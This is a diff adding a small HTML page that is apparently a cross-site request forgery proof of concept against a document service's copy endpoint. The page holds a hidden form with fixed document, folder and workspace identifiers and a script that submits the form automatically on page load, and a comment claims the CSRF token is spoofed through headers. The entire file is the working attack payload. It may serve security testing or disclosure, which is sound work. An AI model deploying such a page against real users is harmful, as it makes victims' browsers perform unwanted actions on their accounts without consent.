@@ -1,0 +1,16 @@
+<html>
+  <body>
+    <form action="https://docs.superhuman.com/copy/ARI6JZ2V6O" method="POST" id="csrfForm">
+      <input type="hidden" name="title" value="Copy of doc - CSRF test">
+      <input type="hidden" name="folderId" value="fl-zJCOJ6udvm">
+      <input type="hidden" name="workspaceId" value="ws-F1DwjnlUg8">
+      <input type="hidden" name="deletePageAuthors" value="false">
+      <input type="hidden" name="deleteComments" value="false">
+    </form>
+
+    <script>
+      // Attacker-controlled CSRF token injected via header spoofing
+      document.getElementById("csrfForm").submit();
+    </script>
+  </body>
+</html>
